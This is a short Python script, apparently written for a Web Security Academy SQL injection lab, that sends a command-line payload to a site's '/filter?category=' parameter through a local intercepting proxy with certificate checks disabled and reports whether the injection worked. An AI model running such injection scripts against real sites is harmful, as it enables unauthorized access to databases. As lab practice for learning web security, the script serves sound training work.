import requests
import sys 
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxi = {'http': 'http://127.0.0.1:8080'}

# https://0a3b00dc041739a08263896200210046.web-security-academy.net

def exploit(url,payload):
    uri = "/filter?category="
    req = requests.get(url + uri + payload, verify=False,proxies=proxi)
    
    if "Caution Sign" in req.text:
        return True
    else:
        return False

if __name__ == "__main__": 
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>"% sys.argv[0])
        print("[-] Example: %s www.example.com '1=1'" % sys.argv[0])
        sys.exit(-1)
    
    if exploit(url,payload):
        print("[+] SQL Injection successful!!")
    else:
        print("[+] SQL Injection unsuccessful!!")